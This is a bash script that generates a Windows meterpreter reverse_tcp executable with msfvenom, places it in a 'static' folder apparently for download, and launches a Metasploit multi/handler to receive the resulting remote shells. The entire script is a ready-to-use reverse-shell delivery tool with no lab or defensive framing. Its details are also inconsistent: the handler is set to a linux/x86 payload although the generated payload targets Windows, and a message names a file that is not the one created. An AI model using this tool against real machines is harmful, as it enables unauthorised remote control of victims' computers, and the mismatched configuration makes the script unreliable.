#!/bin/bash

# Parse command-line arguments
while getopts ":i:p:" opt; do
  case ${opt} in
    i )
      LHOST=$OPTARG
      ;;
    p )
      LPORT=$OPTARG
      ;;
    \? )
      echo "Usage: $0 -i <local IP address> -p <local port>"
      exit 1
      ;;
    : )
      echo "Invalid option: $OPTARG requires an argument"
      exit 1
      ;;
  esac
done

# Check if IP address and port are set
if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
  echo "Usage: $0 -i <local IP address> -p <local port>"
  exit 1
fi

# Generate the binary payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > shell_p.exe

# Print a success message
echo "Payload generated: shell.exe"

mv shell_p.exe static/.
# Print a success message
echo "Changed dir to: static"
cd static
# Start Metasploit multi/handler module
echo "Starting Metasploit multi/handler module..."
echo "use exploit/multi/handler" > msfconsole.rc
echo "set PAYLOAD linux/x86/meterpreter/reverse_tcp" >> msfconsole.rc
echo "set LHOST 0.0.0.0" >> msfconsole.rc
echo "set LPORT $LPORT" >> msfconsole.rc
echo "set ExitOnSession false" >> msfconsole.rc
echo "exploit -j" >> msfconsole.rc
msfconsole -r msfconsole.rc
rm -f msfconsole.rc

